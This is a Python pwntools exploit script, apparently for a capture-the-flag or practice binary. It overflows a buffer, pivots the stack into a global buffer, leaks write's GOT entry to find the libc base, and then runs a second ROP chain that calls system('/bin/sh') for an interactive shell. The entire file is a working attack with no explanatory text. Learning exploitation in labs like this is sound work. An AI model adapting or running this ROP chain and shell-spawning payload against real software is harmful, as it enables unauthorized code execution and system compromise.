from pwn import *

TARGET = "./target"
context.binary = TARGET
context.terminal = ["tmux", "splitw", "-h"]

e = ELF(TARGET)
libc = e.libc

p = gdb.debug(
    [TARGET],
    gdbscript="""
break start
continue""",
)
# p = process([TARGET])


# first payload
offset = 272
addr_gbuf = e.symbols["gbuf"]

# fake rbp
payload1 = p64(0xDEADBEEF)

# leak libc
r = ROP(e)
r.write(1, e.got["write"], 8)
print(r.dump())
payload1 += r.chain()

# get second payload
r = ROP(e)
r.read(0, addr_gbuf + 2048, 32)
print(r.dump())
payload1 += r.chain()

# move to the second payload
r = ROP(e)
r.migrate(addr_gbuf + 2048)
print(r.dump())
payload1 += r.chain()

# dummy
payload1 += b"A" * (offset - len(payload1))

# pivotting
payload1 += p64(e.symbols["gbuf"])
payload1 += p64(r.leave.address)

# send payload
p.recvline()  # consume "Enter your input\n"
p.sendline(payload1)

# leak
leaked_raw = u64(p.recv(8))
print("leaked got of write:", hex(leaked_raw))

leaked_libc_base = leaked_raw - libc.symbols["write"]
print("leaked libc base:", hex(leaked_libc_base))
libc.address = leaked_libc_base


# second payload

# system("/bin/sh")
r = ROP(libc)
r.system(next(libc.search(b"/bin/sh\x00")))
print(r.dump())

payload2 = r.chain()

# send payload
p.sendline(payload2)

p.interactive()